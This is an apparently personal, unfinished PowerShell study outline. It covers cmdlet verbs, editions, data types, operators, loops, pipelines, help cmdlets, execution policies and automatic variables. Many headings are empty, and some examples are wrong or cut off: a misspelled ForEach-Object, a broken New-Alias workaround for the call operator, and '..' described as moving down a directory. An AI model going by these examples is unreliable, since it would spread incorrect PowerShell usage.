Powershell 101:
==============
Basic Theory/Concepts:
	Powershell is a special type of shell:
		A. Powershell is built on top of .NET Framework:
		B. Powershell is Object-Based Shell:
			Basics:
				It means, in powershell everything is an object.
			Object:
				Basics:
					Literally everything, like a variable, class, function, object member's etc are an object.
				Object Class:(aka Class)
					Basics:
						Class is a special type of object thats used as a blueprint for making new objects.
				Members:(aka Object Members)(aka Components of Object)
					Basics:
					Types:(3)
						A. Primary Members:(2)
							1. Properties:(aka Object Properties)(aka Attributes)
								Basics:
									Properties refer to the information we can retrieve and/or set by name.
								Syntax:
									Normal name without space and '()'
							2. Methods:(aka Object Methods)
								Basics:
									Methods refer to operations that can be performed on the data.
									Methods can take arguments to determine what to do or to provide additional information.
								Syntax:
									Normal name without space and with '()' at the end
						B. Instrinsic Members:
							Basics:
								Intrinsic members are hidden primary members(properties and methods) that the powershell engine adds to each objects.
							Types:
								Note:
									Read 'https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_intrinsic_members?view=powershell-7.2'
						C. Optional Members:(8)
							1. AliasProperty:
							2. CodeProperty:
							3. NoteProperty:
							4. ScriptProperty:
							5. ParameterizedProperty:
							6. Event:
							7. ScriptMethod:
							8. CodeMethod:
							Note:
								Read 'https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.psmembertypes?view=powershellsdk-7.0.0' for more info.
						Note:
							In almost every blog/every book, it is stated that an object has only two members, ie, 'Properties' & 'Methods', however, according to 'Get-Member' cmdlet, there are 10 different members including 'Properties' & 'Methods'. Therefore, i have classified "'Properties' & 'Methods'" as Primary members and rest as optional.
		C. Powershell is case-insensitive:
			It means 'Hello' is same as 'HELLO' in powershell.
	Powershell Feautures:
		1. Access to existing windows CMD tools.
		2. Powershell CmdLets:(aka Command-Lets)(aka Cmdlets)
			Basics:
				Cmdlets differ from commands as cmdlets are instances of .NET classes. They are not stand-alone executables unlike commands.
			Syntax:
				Cmdlets have a 'Verb-Noun' pair syntax as explained below.
				Powershell Verbs:
					Basics:
						Types:(7)
							A. Common Verbs:
								Basics:
									These verbs define generic actions that can be applied to almost any cmdlet.
								Types:(34)
									1. New:(n)
										Creates a resource.
									2. Add:(a)
										Adds a resource to an existing container, or attaches an item to another item.
									3. Rename:(rn)
										Changes the name of a resource.
									4. Move:(m)
										Moves a resource from one location to another.
									5. Copy:(cp)
										Copies a resource to another name or to another container.
									6. Remove:(r)
										Deletes a resource from a container.
									7. Clear:(cl)
										Removes all the resources from a container but does not delete the container.
									8. Select:(sc)
										Locates a resource in a container. For example, the Select-String.
									9. Find:(fd)
										Looks for an object in a container.
									10. Search:(sr)
										Creates a reference to a resource in a container.
									11. Get:(g)
										Specifies an action that retrieves a resource.
									12. Set:(s)
										Replaces data on an existing resource or creates a resource that contains some data.
									13. Reset:(rs)
										Sets a resource back to its original state.
									14. Hide:(h)
										Makes a resource undetectable.
									15. Show:(sh)
										Makes a resource visible to the user.
									16. Split:(sl)
										Separates parts of a resource.
									17. Join:(j)
										Combines resources into one resource.
									18. Format:(f)
										Arranges objects in a specified form or layout
									19. Resize:(rz)
										Changes the size of a resource.
									20. Enter:(et)
										Specifies an action that allows the user to move into a resource.
									21. Exit:(ex)
										Sets the current environment or context to the most recently used context.
									22. Open:(op)
										Changes the state of a resource to make it accessible, available, or usable.
									23. Close:(cs)
										Changes the state of a resource to make it inaccessible, unavailable, or unusable.
									24. Lock:(lk)
										Secures a resource.
									25. Unlock:(uk)
										Releases a resource that was locked.
									26. Undo:(un)
										Sets a resource to its previous state.
									27. Redo:(re)
										Resets a resource to the state that was undone.
									28. Skip:(sk)
										Bypasses one or more resources or points in a sequence.
									29. Step:(st)
										Moves to the next point or resource in a sequence.
									30. Switch:(sw)
										Specifies an action that alternates between two resources, such as to change between two locations, responsibilities, or states.
									31. Push:(pu)
										Adds an item to the top of a stack.
									32. Pop:(pop)
										Removes an item from the top of a stack.
									33. Watch:(wc)
										Continually inspects or monitors a resource for changes.
									34. Optimize:(om)
										Increases the effectiveness of a resource.
							B. Communications Verbs:
								Basics:
									These verbs define actions that are applied to communications.
								Types:(6)
									1. Connect:(cc)
										Creates a link between a source and a destination.
									2. Disconnect:(dc)
										Terminates the link between a source and a destination.
									3. Read:(rd)
										Acquires information from a source(console or pipeline). This verb is paired with Write.
									4. Write:(wr)
										Adds information to a target(console or pipeline). This verb is paired with Read.
									5. Receive:(rc)
										Accepts information sent from a source(network stream). This verb is paired with Send.
									6. Send:(sd)
										Delivers information to a destination(network stream). This verb is paired with Receive.
							C. Data Verbs:
								Basics:
									These verbs define actions that are applied to data handling.
								Types:(24)
									1. Out:(o)
										Sends data out of the environment.
									2. Edit:(ed)
										Modifies existing data by adding or removing content.
									3. Compare:(cr)
										Evaluates the data from one resource against the data from another resource.
									4. Compress:(cm)
										Compacts the data of a resource.
									5. Expand:(en)
										Restores the data of a resource that has been compressed to its original state.
									6. Group:(gp)
										Arranges or associates one or more resources
									7. Merge:(mg)
										Creates a single resource from multiple resources.
									8. Convert:(cv)
										Changes the data from one representation to another when the cmdlet supports bidirectional conversion or when the cmdlet supports conversion between multiple data types.
									9. ConvertFrom:(cf)
										Converts one primary type of input to one or more supported output types.
									10. ConvertTo:(ct)
										Converts from one or more types of input to a primary output type
									11. Mount:(mt)
										Attaches a named entity to a location.
									12. Dismount:(dm)
										Detaches a named entity from a location.
									13. Import:(ip)
										Creates a resource from data that is stored in a persistent data store(such as a file) or in an interchange format.
									14. Export:(ep)
										Encapsulates the primary input into a persistent data store, such as a file, or into an interchange format.
									15. Publish:(pb)
										Makes a resource available to others. This verb is paired with Unpublish.
									16. Unpublish:(ub)
										Makes a resource unavailable to others. This verb is paired with Publish.
									17. Initialize:(in)
										Prepares a resource for use, and sets it to a default state.
									18. Update:(ud)
										Brings a resource up-to-date to maintain its state, accuracy, conformance, or compliance.\
									19. Backup:(ba)
										Stores data by replicating it.
									20. Checkpoint:(ch)
										Creates a snapshot of the current state of the data or of its configuration.
									21. Restore:(rr)
										Sets a resource to a predefined state, such as a state set by Checkpoint.
									22. Sync:(sy)
										Assures that two or more resources are in the same state.
									23. Save:(sv)
										Preserves data to avoid loss.
									24. Limit:(l)
										Applies constraints to a resource.
							D. Diagnostic Verbs:
								Basics:
									These verbs define actions that are applied to diagnostics.
								Types:(7)
									1. Debug:(db)
										Examines a resource to diagnose operational problems.
									2. Repair:(rp)
										Restores a resource to a usable condition
									3. Ping:(pi)(Deprecated)
										Note:
											'Ping' verb is now deprecated, so use 'Test' verb instead.
									4. Test:(t)
										Verifies the operation or consistency of a resource.
									5. Measure:(ms)
										Identifies resources that are consumed by a specified operation, or retrieves statistics about a resource.
									6. Resolve:(rv)
										Maps a shorthand representation of a resource to a more complete representation.
									7. Trace:(tr)
										Tracks the activities of a resource.
							E. Lifecycle Verbs:
								Basics:
									These verbs define actions that are applied to lifecycle of a resource.
								Types:(22)
									1. Invoke:(i)
										Performs an action, such as running a command or a method
									2. Request:(rq)
										Asks for a resource or asks for permissions.
									3. Approve:(ap)
										Confirms or agrees to the status of a resource or process.	
									4. Assert:(as)
										Affirms the state of a resource.
									5. Build:(bd)
										Creates an artifact(usually a binary or document) out of some set of input files
									6. Deploy:(dp)
										Sends an application, website, or solution to a remote target[s] in such a way that a consumer of that solution can access it after deployment is complete.
									7. Complete:(cp)
										Concludes an operation.	
									8. Confirm:(cn)
										Acknowledges, verifies, or validates the state of a resource or process
									9. Deny:(dn)
										Refuses, objects, blocks, or opposes the state of a resource or process
									10. Enable:(e)
										Configures a resource to an available or active state.
									11. Disable:(d)
										Configures a resource to an unavailable or inactive state.
									12. Restart:(rt)
										Stops an operation and then starts it again.
									13. Start:(sa)
										Initiates an operation.
									14. Stop:(sp)
										Discontinues an activity.
									15. Submit:(sb)
										Presents a resource for approval.
									16. Resume:(ru)
										Starts an operation that has been suspended.
									17. Suspend:(ss)
										Pauses an activity.
									18. Wait:(w)
										Pauses an operation until a specified event occurs.
									19. Install:(is)
										Places a resource in a location, and optionally initializes it. This verb is paired with Uninstall
									20. Uninstall:(us)
										Removes a resource from an indicated location.
									21. Register:(rg)
										Creates an entry for a resource in a repository such as a database.
									22. Unregister:(ur)
										Removes the entry for a resource from a repository.
							F. Security Verbs:
								Basics:
									These verbs define actions that are applied to security.
								Types:(6)
									1. Unblock:(ul)
										Removes restrictions to a resource.
									2. Block:(bl)
										Restricts access to a resource.
									3. Grant:(gr)
										Allows access to a resource.
									4. Revoke:(rk)
										Specifies an action that does not allow access to a resource.
									5. Protect:(pt)
										Safeguards a resource from attack or loss.
									6. Unprotect:(up)
										Removes safeguards from a resource that were added to prevent it from attack or loss.
							G. Other Verbs:
								Basics:
								Types:(1)
									1. Use:(u)
											Uses or includes a resource to do something.
							Note:
								In above syntax of 'verb:(<>)', '<>' represents alias for the verb
							Note:
								Use-case of some verbs sound familiar, but is not. Read below to see differences:
									https://gist.github.com/Odepax/645634b1a2ec307b05f5cbc48e17c699#:~:text=Read%20vs.,the%20console%20or%20the%20pipeline.
					Get-Verb:
						Basics:
							Prints powershell verbs.
						Usage:
							Flags:
								-Group <verb_type> => Show verbs of specified type only
				Powershell Nouns:
					Basics:
		3. Powershell Functions:
			Basics:
				They are different from cmdlets.
		4. Access to .Net Framework API:
		5. Access to WMI:
		6. Access to Windows COM:
		7. Access to WinAPI:
	Powershell Editions:(2)
		A. Windows Powershell:
			Basics:
				Its only accessible on windows and is installed by default. It has more cmdlets than core. It needs to use 3rd party SSH support.
				It needs Full .NET Framework to operate, which is installed by default on window by default. 
			Versions:(6)
				1. Powershell v1.0:
					Basics:
						Available on Windows server 2008
						Accessible on Windows XP, Server 2003, Vista
				2. Powershell v2.0:
					Basics:
						Available on Windows 7 & Server 2008 R2
						Accessible on Windows XP, Vista, Server 2003, 2008
						Requires .NET Framework 2.0
					Note:
						Powershell v2.0 was deprecated in Windows 10 version 1709
				3. Powershell v3.0:
					Basics:
						Available on Windows 8 & Server 2012
						Accessible on Windows 7 & Server 2008, 2012
						Requires .NET Framework 4.0 or later
				4. Powershell v4.0:
					Basics:
						Available on Windows 8.1 & Server 2012 R2
						Accessible on Windows 7, Server 2008, 2012
						Requires .NET Framework 4.5 or later
				5. Powershell v5.0:
					Basics:
						Available on Windows 10
						Accessible on Windows 7, 8.1, Server 2008, 2012
						Requires .NET Framework 4.5 or later
				6. Powershell v5.1:
					Basics:
						Available on Windows 10, Server 2016
						Accessible on Windows 7, 8.1, Server 2008, 2012, 2016
			Types:
			Windows Powershell Hosts:
				Basics:
				Main Hosts:(4)
					1. Powershell Console:(powershell.exe)
						Basics:
							Types:
								1. 32-bit:
								2. 64-bit:
						Location:
							32-bit Powershell:
								c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
							64-bit Powershell:
								c:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
					2. Powershell ISE:(powershell_ise.exe)(Powershell Integrated Scripting Environment)
						Basics:
					3. WAC:(Windows Admin Center)
						Basics:
					4. PSWA:(PowerShell Web Access)
						Basics:
		B. Powershell Core:(https://github.com/PowerShell/PowerShell)
			Basics:
				Its not installed by default on windows. It is cross-platform, ie, accessible on linux, windows and macOS. Its open-source on github. It has less cmdlets. It has built-in SSH support.
				It needs .NET Core Framework, which is not installed on windows by default.
			Versions:
				1. Powershell Core 6.0:
				2. Powershell Core 6.1:
				3. Powershell Core 7.0:
			Powershell Core Hosts:
				Basics:
				Powershell Console:(pwsh.exe)
					Basics:
						Its the main host for Powershell Core.
			Note:
				Microsoft renamed 'Powershell Core' to just 'Powershell'. However, to avoid confusion, i'm using 'Powershell Core' name only.
		Note:
			Script written for Powershell Core cannot run on Windows Powershell and vice-versa.
		Note:
			Installing multiple versions and editions of powershell side-by-side has no issues. They work independently without overlapping with each other.
	Powershell Files:
		Powershell Script:(.ps1)
			Read 'Powershell Scripts' Section.
		PowerShell Profile:(.ps1)
		Powershell Module:(.psm1)(aka Powershell Module Script)
		Powershell Console:(.psc1)
		Powershell Configuration:(.ps1xml)
	Basic Concepts:
		PS Comments:
			A. Single-Line Comment:
				Syntax:
					#comment
			B. Multi-Line Comment:
				Syntax:
					<# comment1
					comment2 #>
		PS Data Types:
			Types:(5)
				A. Special Types:(3)
					1. Void Type:
						Basics:
					2. Null Type:
						Basics:
					3. Object Type:
						Basics:
				B. Value Types:(6)
					1. Boolean Type:
						bool:
							Size:
							Range:
								It has only two values:
									$true
									$false
					2. Character Type:
						char:
							Size => 
							Range =>
					3. Integer Types:
						A. Signed Integer Types:
							Basics:
								'Signed' means having a sign, that is, both negative and positive integers.
							Types:(2)
								1. int:
									Size => 32 bits
									Range:
								2. long:
									Size => 64 bits
									Range:
						B. Unsigned Integer Types:
							byte:
								Size => 8 bits
								Range => 0 to 255
					4. Real Number Types:
						A. Decimal Type:
							decimal:
								Size => 128 bits
								Range =>
						B. Floating-point Decimal Types:(3)
							1. float:
								Size => 32 bits
								Range =>
							2. single:
								Size => 32 bits
								Range =>
							3. double:
								Size => 64 bits
								Range =>
					5. Switch Type:
						Basics:
					6. Enumeration Types Type:
						Basics:
				C. Reference Types:(8)
					1. String Type:
						Basics:
							Its an immutable sequence of zero or more characters of type char each containing a UTF-16-encoded 16-bit Unicode code point.
					2. Arrays:(aka Collections)(aka Powershell Collections)
						Basics:
							Start from 0 to n-1, where 'n' is size of array.
							https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-arrays?view=powershell-7.2
					3. Hashtable Type:
						Hashtable:
					4. XML Type:
						xml:
					5. Regex Type:
						regex:
					6. Ref Type:
						ref:
					7. Scriptblock Type:
						Basics:
							It represents a precompiled block of script text that can be used as a single unit.
						scriptblock:
					8. Math Type:
						Basics:
							It provides access to some constants and methods useful in mathematical computations
						math:
				D. Generic Types:
					Basics:
				E. Anonymous Types:
					Basics:
		PS Operators:
			Types:(7)
				A. Arithmetic Operators:
					Types:(8)
						1. Addition Operator:(+)
						2. Subtraction Operator:(-)
						3. Multiplication Operator:(*)
						4. Divison Operator:(/)
						5. Modulus Operator:(%)
						6. BitWise Operators:(4)
							A. Bitwise AND Operator:(-band)
							B. Bitwise OR Operator:(-bor)
							C. Bitwise NOT Operator:(-bnot)
							D. Bitwise XOR Operator:(-bxor)
						7. Shift Operators:(2)
							A. Shift bits to left Operator:(-shl)
							B. Shift bits to right Operator:(-shr)
						8. Unary Operators:(2)
							A. Increment Operator:(++)
							B. Decrement Operator:(--)
				B. Assignment Operators:
					Types:(6)
						1. =
						2. +=
						3. -=
						4. *=
						5. /=
						6. %=
						7. ++
						8. --
						9. Null-Coalescing:(??=)
							Basics:
								The null-coalescing assignment operator ??= assigns the value of its right-hand operand to its left-hand operand only if the left-hand operand evaluates to null.
							Usage:
								$x = $null
								$x ??= 100 # x becomes 100
				C. Comparison Operators:
					Types:(5)
						1. Equality Operators:
							Basics:
							Types:(7)
								A. -eq:(Equal to)
								B. -ceq:(Case-Sensitive Equal to)
								C. -ne:(Not equal to)
								D. -gt:(Greater than)
								E. -ge:(Greater than or equal to)
								F. -lt:(Less than)
								G. -le:(Less than or equal to)
						2. Matching Operators:
							Basics:
							Types:(4)				
								A. -like:
									String matches wildcard pattern
								B. -notlike:
									String dont match wildcard pattern
								C. -match:
									String matches regex pattern
								D. -notmatch:
									String dont match regex pattern
						3. Replacement Operator:
							-replace:
								Replaces strings matching a regex pattern
						4. Contianment Operators:
							Basics:
							Types:(4)
								A. -contains:
									Collection contains a value
								B. -notcontains:
									Collection dont contains a value
								C. -in:
									Value is in a collection
								D. -notin:
									Value is not in a collection
						5. Type Operators:
							Basics:
							Types:(2)
								A. -is:
									Objects are of same type
								B. -isnot:
									Objects are not of same type
				D. Logical Operators:
					Types:
						1. -and:(Logical AND)
						2. -or:(Logical OR)
						3. -xor:(Logical XOR)
						4. -not:(Logical Not)
						5. !:(Logical Not)
				E. Redirection Operators:
					Read IO Concepts Section
				F. Type Operators:
					Basics:
						Type operators are used to check if an object is of specified datatype or to convert an object into specified datatype.
					Types:(3)
						1. -is:
							Basics:
								It returns $true if type of object is same as specified datatype, else $false
							Usage:
								$a -is [<data_type>]
						2. -isnot:
							Basics:
								It returns $true if type of object is not same as specified datatype, else $false
							Usage:
								$a -isnot [<data_type>]
						3. -as:
							Basics:
								It converts a given object to specified datatype
							Usage:
								$a -as [<data_type>]
						Note:
							Some operators are same as operators of other categories, but have completely different use-case with respect to data-type.
				G. Special Operators:(12)
					1. Background Operator:(&)
						Read 'Process, Thread, Job & Signal Management' Section.
					2. Pipeline Operators:(|,||,&&)
						Read IO Basics Section
					3. Ternary Operator:(?<if-true>:<if-false>)
						Read 'Loops & Conditionals' Section
					4. Format Operator:(-f)
						Basics:
						Usage:
					5. Split Operator:(-Split)
						Basics:
							Its used to split one or more strings into substrings.
						Usage:
					6. Join Operator:(-Join)
						Basics:
							Its used to combine multiple strings into a single string.
						Usage:
					7. Grouping Operator:((..))
						Uses:(2)
							A. Override operator precedence:
								(1+2)/3
							B. Use output of a command in an expression:
								$a = (Get-Item *.txt).Count -gt 10
					8. Subexpression Operator:($())
						Basics:
							Its used to return result of a command inside a string.
						Usage:
							$a = "Today is $(Get-Date)"
					9. Array Subexpression Operator:(@())
						Basics:
						Usage:
					10. HashTable Literal Sytnax:(@{})
						Basics:
						Usage:
					11. Call Operator:(&)(aka Invocation Operator)
						Basics:
							It allows to run commands/scripts/scriptblocks stored in variables/strings.
						Usage:
							$c = "gci"
							& $c
						Note:
							Call Operator cannot be used if a variable stores a command that expects/has a parameter as explained below:
								$c = "gci -Force"
								& $c #Error
							So, in such cases, we have two solutions:
								A. Using 'Invoke-Expression' Cmdlet:
									Read 'Invoke-Expression' Section.
								B. Lengthy Non-Official Solution:
									New-Alias -Name G -Value gci -Force
									$c = G
									& $c #No error
					12. Range Operator:(..)
						Basics:
							Its used to represent sequential integers in an integer array given starting and ending element.
						Syntax:
							<start>..<end>
						Usage:
							foreach ($a in 1..$max) {Write-Host $a}
		PS Statements, Loops & Conditionals:
			Powershell Statements:(2)
				A. Break:
					Basics:
						Its used to exit a loop or a conditional.
						It can be used in loops, conditionals and trap only.
				B. Continue:
					Basics:
						With Continue you can stop the script inside the loop body and continue to the next iteration of the loop.
						It can be used in loops, conditionals and trap only.
			Powershell Conditionals:(3)
				A. If Else & ElseIf:
					1. If Statement:
						Syntax:
							if (<condition>)
							{
								code
							}
					2. Else Statement:
						Syntax:
							if (<condition>)
							{
								code
							}
							else
							{
								code
							}
					3. ElseIf Statement:
						Syntax:
							if (<condition>)
							{
								code
							}
							elseif(<condition>)
							{
								code
							}
							else
							{
								code
							}
				B. Switch:
					Basics:
						$switch:
					Usage:
						Syntax:
							switch ($x)
							{
								val_1 {
									code
								}
								val_2 {
									code
								}
								default {
									code
								}
							}
						Example:
							Example-1:
								$day = 5
								switch ($day)
								{
									0 { $result = 'Sunday'    }
									1 { $result = 'Monday'    }
									2 { $result = 'Tuesday'   }
									3 { $result = 'Wednesday' }
									4 { $result = 'Thursday'  }
									5 { $result = 'Friday'    }
									6 { $result = 'Saturday'  }
									default { $result = 'null'}
								}
							Example-2:
								$item = "Role"
								switch ($item)
								{
									"Component"
									{
										'is a component'
										continue
									}
									"Role"
									{
										'is a role'
										continue
									}
									"Location"
									{
										'is a location'
										break
									}
								}
				C. Ternary Operator:(Powershell 7 only)
					Basics:
					Usage:
						Syntax:
							<condition>?<if-true>:<if-false>
							$var = <condition>?<if-true>:<if-false>
						Example:
							$x = ($x -lt 100)?200:0
			Powershell Loops:(7)
				A. For Loop:
					Basics:
						Its mainly used repeat a block of code a specified number of times.
					Usage:
						Syntax:
							for(<Counter defintion/declaration>; <condition>; <counter increment/decrement>)
							{
								code
							}
						Example:
							for($i = 0; $i -lt $array.length; $i++){ $array[$i] }
				B. For Loop's Shorthand:
					Basics:
						Code below is a short-hand for 'For' loop.
					Usage:
						Syntax:
							<range> | % { code }
						Example:
							1..10 | % {Write-Host 'Hello'}
				C. ForEach Loop:
					Basics:
						Its used to iprocess each item in an array or collection.
						$foreach:
					Usage:
						Syntax:
							foreach ($<item> in $<collection>){<code>}
						Example:
							foreach ($letter in $letterArray){ Write-Host $letter }
				D. ForEach-Object Loop:
					Basics:
						Its similar as 'ForEach' loop, however only this loop has functionality of using scriptblock, which can be benificial in cases such as clean up after a script run, etc.
					Usage:
						Way-1:
							<cmdlet> | ForEach-Object {} => 
							Example:
								$x = gci -Force | For-EachObject {}
						Way-2:(Using Flags)
							ForEach-Object -InputObject <> -Process {} => 
							Example:
								$x = gci -Force
								For-EachObject -Inpu
							Flags:
								-InputObject <> => 
								-Process {} => 
				E. While Loop:
					Basics:
						While loop runs till the condition is true.
					Usage:
						Syntax:
							while(<condition>)
							{
								code
							}
						Example:
							$i = 0
							while ($i -le 8)
							{
								Write-Host $i
								$i++
							}
				F. Do-While Loop:
					Basics:
						Do-While keeps running as long as the condition is true. When the condition is false it will stop.
						Here, the condition is evaluated after code has been executed, So a 'do-while' loop runs atleast once.
					Usage:
						Syntax:
							do {<code>} while (<condition>)
						Example:
							$i = 0
							do {
								Write-Host $i
								$i++
							}
							while ($i -le 8)
				G. Do-Until Loop:
					Basics:
						Do-Until keeps running as long as the condition is false. When the condition becomes true it will stop.
						Here, the condition is evaluated after code has been executed, a 'do-until' loop runs atleast once.
					Usage:
						Syntax:
							do {<code>} until (<condition>)
						Example:
							$i = 0
							do {
								Write-Host $i
								$i++
							}
							until ($i -eq 8)
		Error Handling:
			Try:
			Catch:
			Finally:
			Throw:
			Trap:
		Powershell Functions:
	Powershell ScriptBlock:
		Basics:
			Its a collection of statements or expressions that can be used as a single unit. A script block can accept arguments and return values.
		Usage:
			Syntax:
				{<Statment>}
	Powershell Scripts:
		Basics:
	IO Concepts:
		Wildcard Characters:
			Basics:
			Types:(5)
				1. *
				2. ?
				3. [<start>-<end>]
				4. .
					Basics:
						It refers to PWD
					Usage Example:
						gci . => Its same as gci <current_location>
				5 ..
					Basics:
						Its same as that of linux, and is used to shift one directory down.
					Usage Example:
						cd ..\
		PipeLine:
			Basics:
				In CMD/Bash shell, pipeline works like this, 'Command1|Command2' can be translated as StdOut from Command1 is used as StdIn by Command2.
				However, In Powershell, PipeLine works in two ways:
					A. By Value:
						Basics:
					B. By Property Name:
						Basics:
			Pipe Operator:(|)
				Basics:
					Sends ("pipes") the output of the command that precedes it to the command that follows it.
					When the output includes more than one object (a "collection"), the pipeline operator sends the objects one at a time.
				Usage:
					Note:
						For more info, run "Get-Help about_pipelines"
			Tee-Object:
				Basics:
				Usage:
					Flags:
						-variable sniff => 
		Redirection:
			Basics:
			https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_redirection?view=powershell-7.2
	Help Management:
		Get-Help:
			Basics:
				Shows help for the specified cmdlet
			Usage:
				Get-Help <cmdlet> => Shows help for given cmdlet
				Flags:
					-Name <cmdlet>
					-detailed => 
					-examples => 
					-online => 
					-showwindow => Display help in a pop-up
		Man:
			Basics:
				Man is an alias for 'help'
			Usage:
				man <cmdlet>
		Help:
			Basics:
				Help is a PS function that works like an in-built alias for 'Get-Help <cmdlet> | more'
			Usage:
				help <cmdlet>
		Update-Help:
			Basics:
				Its used to update 'Get-Help' local help files from microsoft via internet.
			Usage:
				Update-Help
				Flags:
		GCM:
			Its an Alias for 'Get-Command', Read 'Get-Command' Section below.
		Get-Command:
			Basics:
			Usage:
				Get-Command => Prints all cmdlets, functions, and aliases that are installed on the computer.
				Get-Command -ListImportted => Prints only imported commands of the current session
				Flags:
					-ListImported => Prints only imported commands of the current session
					-Module <module_name> => Print all commands of the specified module
Execution Policy Management:
	Basics:
		Its basically a safety feature that controls the conditions under which powershell can load configuration files and runs scripts.
		It can be set an for local computer, current user, or a session.
		Execution policies for local computer and current user are stored in the registry and the execution policy for a particular session is stored only in memory and is lost when the session is closed.
		Execution Policies:(7)
			1. Default:
				Basics:
					When set:
						It sets to Restricted for Windows clients.
						It sets to RemoteSigned for Windows servers.
			2. AllSigned:
				Basics:
					It requires that all scripts and configuration files be signed by a trusted publisher, including scripts that you write on the local computer.
					It prompts you before running scripts from publishers that you haven't yet classified as trusted or untrusted.
			3. RemoteSigned:
				Basics:
					Its the default execution policy for servers.
					It requires a digital signature from a trusted publisher on scripts and configuration files that are downloaded from the internet.
					It doesn't require digital signatures on scripts that are written on the local computer.
					It can run scripts that are downloaded from the internet and not signed, if the scripts are unblocked by using the Unblock-File cmdlet.
			4. Restricted:
				Basics:
					It the default execution policy for Windows client computers.
					It dont allow to run scripts.
			5. UnRestricted:
				Basics:
					Its the default execution policy for non-Windows computers and cannot be changed.
					It can run unsigned scripts.
			6. Undefined:
				Basics:
					This policy literally converys that there is no execution policy set in the current scope.
					Note:
						If the execution policy in all scopes is Undefined, the effective execution policy is Restricted for Windows clients and RemoteSigned for Windows Server.
			7. Bypass:
				Basics:
					Nothing is blocked and there are no warnings or prompts.
		Scope:
			Basics:
				Scope in reference to Execution Policy refers to the objects on which it can be applied
			Types:(5)(Precedence => High to Low)
				1. MachinePolicy:
					Basics:
				2. UserPolicy:
					Basics:
				3. Process:
					Basics:
				4. CurrentUser:
					Basics:
				5. LocalMachine:
					Basics:
	Before getting shell:(Via powershell.exe)
		Basics:
			Read 'Shell & Terminal Management' Section
		Usage:
			powershell.exe -ExecutionPolicy <execution_policy_to_apply> <other flags>
			powershell.exe -Exec <execution_policy_to_apply> <other flags>
			powershell.exe -ep <execution_policy_to_apply> <other flags>
			Flags:
				Read 'Shell & Terminal Management' Section
	After getting shell:(Inside Powershell)
		Get-ExecutionPolicy:
			Basics:
			Usage:
				Flags:
		Set-ExecutionPolicy:
			Basics:
			Usage:
				Flags:
					-ExecutionPolicy <execution_policy_to_apply> => 
					-Force => 
Variable Management:
	Basics:
		Representation:
			Variables are represented by text strings that begin with a dollar sign ($)
		Variable Types:(3)
			A. User-Created Variables:
				Basics:
					Variables created by user.
					Read 'Creating Variables' Section below
			B. Automatic Variables:
				Basics:
					Automatic Variables refer to variables that are created and maintained by powershell and are used to store state information for powershell
				Important Automatic Variables:(32)
					1. $$
						Basics:
							It prints the last token in the last line recieved by current session.
							Note:
								It dont print the last command
					2. $^
						Basics:
							It prints the first token in the last line recieved by current session.
							Note:
								It dont print the last command
					3. $?
						Basics:
							It contains True if last command was succesful, False if last command failed.
					4. $_
						Basics:
							Its used to reference the current item that is being processed.
							Its same as $PSItem.
					5. $PSItem
						Basics:
							Its used to reference the current item that is being processed.
							Its same as $_
					6. $true
						Basics:
							It contains value 'True'
					7. $false
						Basics:
							It contains value 'False'
					8. $null
						Basics:
							It contains value 'null'
					9. $this
						Basics:
					10. $PSStyle
						Basics:
							Its used to view and change the rendering of ANSI string output.
						Usage:
					11. $ShellId
						Basics:
							It contains current shell identifier.
					12. $PSHOME
						Basics:
							it contains the full path of the installation directory for PowerShell.
					13. $HOME
						Basics:
							It contains full path of user's home directory
					14. $PWD
						Basics:
							It contains PWD.
					15. $PROFILE
						Basics:
							It contains full path of the powershell profile for the current user and the current host application
					16. $ConsoleFileName
						Basics:
							It contains path of console file used in the last session
					17. $args
						Basics:
							It contains an array of values for undeclared parameters that are passed to a function, script, or script block.
					18. $PSBoundParameters
						Basics:
							It contains a dictionary of the parameters that are passed to a script or function and their current values.
					19. $PSCommandPath
						Basics:
							It contains the full path and file name of the script that's being run
					20. $PSScriptRoot
						Basics:
							It contains the full path of the executing script's parent directory.
					21. $Error
						Basics:
							It contains an array of error objects of most recent errors.
					22. $StackTrace
						Basics:
							It contains a stack trace for the most recent error.
					23. $Host
						Basics:
							It contains an object that represents current session powershell application.
					24. $PSSenderInfo
						Basics:
							It contains information about the user who started the PSSession
					25. $PSVersionTable
						Basics:
							Read 'Shell Management' Section below.
					26. $NestedPromptLevel
						Basics:
							It contains the current prompt level. A value of 0 indicates the original prompt level. The value is incremented when you enter a nested level and decremented when you exit it.
					27. $PID
						Basics:
							It contains PID of current powershell session.
					28. $LastExitCode
						Basics:
							It contains exit code of the last native program that was run.
					29. $MyInvocation
						Basics:
							It contains info about the current command, such as name, params & their values, and info about how command was started, called, or invoked, such as the name of the script that called the current command.
					30. $IsCoreCLR
						Basics:
							It contains $True if the current session is running on the CoreCLR(.NET Core Runtime), otherwise contains $False
					31. $switch
						Read 'Switch' Sub-Section in 'PS Loops & Conditionals' Section.
					32. $foreach
						Read 'ForEach' Sub-Section in 'PS Loops & Conditionals' Section.
					Doubt:
						. $PSCmdlet
							Basics:
						. $ErrorView
							Basics:
						. $Event
							Basics:
						. $EventArgs
							Basics:
						. $EventSubscriber
							Basics:
						. $Sender
							Basics:
						. $Matches
							Basics:
						. $input
							Basics:
						. $ExecutionContext
							Basics:
			C. Preference Variables:
				Basics:
					These variables are created by PowerShell to store user preferences for powershell and are populated with default values.
					Users can change the values of these variables.
	Creating Variables:
		Creating new variables:
			Syntax:
				$var_name = value
			Examples:
				$v1 = 1 #Integer
				$v2 = 1, 2, 3 #Array
				$v3 = $($v2)
				$v4 = "C:\Windows" #String
				$v5 = (Get-Date).DateTime
				Note:
					Read 'Time Management' Section to read about 'Get-Date'.
		Creating variables from existing variables:
			Syntax:
				$var_name = $($existing_var;new_value)
			Examples:
				$v1 = 1, 2, 3 #Array of 3-elements
				$v2 = $($v1;4) #array of 4-elements
	Variable Conversion:
		Basics:
			Rules:(14)
				A. Conversion to Void:
					1. Any type can be converted to void, result is void, ie, nothing.
				B. Conversion to Bool:
					1. $null/any numeric/char value of 0 is converted to $false and any numeric/char value of non-zero is converted to $true
					2. String of length zero is converted to $false, otherwise $true.
				C. Conversion to char:
					1. Conversion of bool/decimal/float/double to charis not allowed.
					2. $null is converted to U+0000
				D. Conversion to Integer:
				E. Conversion to Float/Double:
